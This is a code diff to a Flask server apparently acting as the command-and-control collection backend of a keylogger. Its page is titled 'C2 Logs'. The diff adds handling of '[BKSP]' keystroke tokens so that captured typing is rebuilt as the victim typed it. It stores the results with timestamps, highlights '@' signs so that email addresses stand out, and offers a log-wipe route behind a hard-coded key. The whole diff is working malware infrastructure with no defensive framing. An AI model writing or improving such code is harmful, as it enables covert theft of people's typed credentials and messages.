@@ -4,14 +4,33 @@ from datetime import datetime
 
 app = Flask(__name__)
 
+def process_backspaces(text):
+    """Simulates real typing: [BKSP] removes the preceding character"""
+    result = []
+    i = 0
+    while i < len(text):
+        if text[i:i+6] == '[BKSP]':
+            if result:
+                result.pop()
+            i += 6
+        else:
+            result.append(text[i])
+            i += 1
+    return ''.join(result)
+
 @app.route('/logs', methods=['GET', 'POST'])
 def handle_logs():
     if request.method == 'POST':
         data = request.get_data(as_text=True)
         if data:
-            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            with open('logs.txt', 'a') as f:
-                f.write(f'[{timestamp}] {data}\n')
+            # Clean up backspaces before saving
+            cleaned_data = process_backspaces(data)
+            
+            # Only save if there is actual content left after cleaning
+            if cleaned_data.strip():
+                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                with open('logs.txt', 'a') as f:
+                    f.write(f'[{timestamp}] {cleaned_data}\n')
             return 'OK', 200
         return 'Empty', 400
     
@@ -20,22 +39,22 @@ def handle_logs():
         with open('logs.txt', 'r') as f:
             raw_content = f.read()
         
-        # Escape HTML special chars first for safety
+        # Escape HTML special chars for safety
         safe_content = raw_content.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
         
         # Highlight every @ symbol in yellow
-        highlighted = safe_content.replace('@', '<span style="background-color: #ffff00; color: #000; font-weight: bold; padding: 0 2px; border-radius: 2px;">@</span>')
+        highlighted = safe_content.replace('@', '<span style="background-color: #ffff00; color: #000; font-weight: bold; padding: 0 3px; border-radius: 3px;">@</span>')
         
-        # Return as HTML page instead of plain text
+        # Return as styled HTML page
         html_page = f"""<!DOCTYPE html>
 <html>
 <head>
     <title>C2 Logs</title>
     <style>
         body {{ background: #1a1a1a; color: #e0e0e0; font-family: 'Courier New', monospace; 
-               padding: 20px; margin: 0; line-height: 1.6; word-wrap: break-word; }}
-        pre {{ white-space: pre-wrap; margin: 0; }}
-        .header {{ color: #888; font-size: 0.9em; margin-bottom: 5px; }}
+               padding: 20px; margin: 0; line-height: 1.8; word-wrap: break-word; }}
+        pre {{ white-space: pre-wrap; margin: 0; font-size: 14px; }}
+        .header {{ color: #666; font-size: 0.85em; margin-bottom: 8px; display: block; }}
     </style>
 </head>
 <body>
@@ -48,8 +67,7 @@ def handle_logs():
 
 @app.route('/reset', methods=['GET'])
 def reset_logs():
-    from flask import request as req
-    key = req.args.get('key', '')
+    key = request.args.get('key', '')
     if key != 'byebye':
         return 'Unauthorized', 403
     if os.path.exists('logs.txt'):
